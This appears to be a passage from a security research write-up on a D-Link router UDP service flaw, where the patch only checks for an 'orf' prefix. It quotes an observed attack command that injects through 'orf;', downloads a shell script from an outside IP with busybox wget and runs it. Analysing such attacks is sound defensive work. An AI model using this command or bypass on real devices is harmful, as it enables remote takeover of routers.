
In 2015, Peter Adkins found that certain D-Link routers were running a UDP server that allowed remote execution of arbitrary commands .
This vulnerability was ostensibly patched, but IoT Inspector Research Lab found that the fix was simply to verify that all command strings had the prefix “orf”.
This mitigation is easily circumvented by prepending “orf;” to any injected command string: orf;malicious_command Exploits require only a single UDP packet from the attacker.
Each observed variant of this attack follows the same steps.
First, the attackers use the open UDP server to inject a shell command: Figure 1.
UDP Packet sent by attacker The injected command, seen in the data field above, is: orf;cd /tmp||cd /var&&busybox
wget hxxp://45[.]61.188.184/f.sh -O b.sh&&sh b.sh;# The invalid “orf” command is ignored and a shell script is downloaded, renamed and executed.
The following is an example of these shell scripts: Figure 2.
One of the shell scripts used in the command injection This script attempts to download and run binary executables on the compromised host.